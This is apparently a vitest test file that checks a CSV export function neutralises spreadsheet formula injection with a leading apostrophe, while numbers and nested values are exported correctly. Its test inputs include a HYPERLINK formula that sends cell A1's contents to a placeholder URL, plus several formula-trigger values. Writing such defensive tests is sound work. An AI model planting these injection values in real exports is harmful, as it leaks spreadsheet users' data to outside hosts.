// SPDX-License-Identifier: Apache-2.0
// Operator CSV exports carry tenant-controlled text (project names, labels),
// so a cell a spreadsheet would read as a formula is neutralised with a leading apostrophe (OWASP CSV injection).
// Numbers stay numbers.

import { describe, expect, it } from "vitest";
import { toCsv } from "../../src/operator/common.ts";

describe("#22 CSV formula injection", () => {
  it.each([
    ['=HYPERLINK("https://x/?"&A1,"x")', `"'=HYPERLINK(""https://x/?""&A1,""x"")"`],
    ["+1+2", "'+1+2"],
    ["-2+3", "'-2+3"],
    ["@SUM(A1)", "'@SUM(A1)"],
    ["\tcmd", "'\tcmd"],
    ["\rcmd", `"'\rcmd"`],
    ["plain name", "plain name"],
  ])("neutralises %j", (name, cell) => {
    expect(toCsv([{ name }])).toBe(`name\r\n${cell}\r\n`);
  });

  it("keeps numbers, including negative ones, as numbers", () => {
    expect(toCsv([{ a: -5, b: -0.25, c: 0, d: "-12.5", e: "-1e3" }])).toBe(
      "a,b,c,d,e\r\n-5,-0.25,0,-12.5,-1e3\r\n",
    );
  });

  it("neutralises array and nested values too", () => {
    expect(toCsv([{ tags: ["=1", "x"], o: { n: "@x" } }])).toBe("tags,o.n\r\n'=1 x,'@x\r\n");
  });
});
